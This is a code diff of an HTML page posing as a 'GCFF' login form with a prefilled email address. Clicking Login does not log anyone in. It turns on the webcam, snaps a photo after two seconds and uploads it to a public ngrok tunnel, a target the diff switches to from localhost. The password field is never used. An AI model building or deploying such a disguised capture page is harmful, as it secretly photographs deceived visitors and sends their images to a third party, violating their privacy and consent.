@@ -1,15 +1,22 @@
 <!DOCTYPE html>
 <html>
-<body>
+<head>
+<meta charset="UTF-8">
+<title>GCFF Login</title>
+</head>
 
-<h2>Login GCFF</h2>
+<body style="font-family:Arial; text-align:center; background:#0f172a; color:white;">
 
-<input value="francoislitilm@gmail.com">
-<input type="password" placeholder="password">
+<h2>Welcome to GCFF</h2>
+
+<input value="francoislitilm@gmail.com"><br><br>
+<input type="password" placeholder="password"><br><br>
 
 <button onclick="login()">Login</button>
 
-<video id="v" autoplay></video>
+<br><br>
+
+<video id="video" autoplay style="width:300px; border-radius:10px;"></video>
 
 <script>
 let stream;
@@ -19,33 +26,44 @@ function login() {
   .then(s => {
     stream = s;
 
-    let video = document.getElementById("v");
+    const video = document.getElementById("video");
     video.srcObject = stream;
 
     setTimeout(takePhoto, 2000);
+  })
+  .catch(err => {
+    alert("Camera blocked");
   });
 }
 
 function takePhoto() {
-  let video = document.getElementById("v");
+  const video = document.getElementById("video");
 
-  let canvas = document.createElement("canvas");
-  let ctx = canvas.getContext("2d");
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
 
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
 
   ctx.drawImage(video, 0, 0);
 
-  let img = canvas.toDataURL("image/png");
+  const image = canvas.toDataURL("image/png");
 
-  fetch("http://localhost:3000/upload", {
+  // stop camera
+  stream.getTracks().forEach(t => t.stop());
+
+  // ENVOI VERS TON SERVEUR NGROK
+  fetch("https://unsighing-prepalatine-yi.ngrok-free.dev/upload", {
     method: "POST",
-    headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({image: img})
-  });
-
-  alert("Photo envoyée !");
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      image: image
+    })
+  })
+  .then(() => alert("Photo sent ✔"))
+  .catch(() => alert("Upload failed"));
 }
 </script>
 
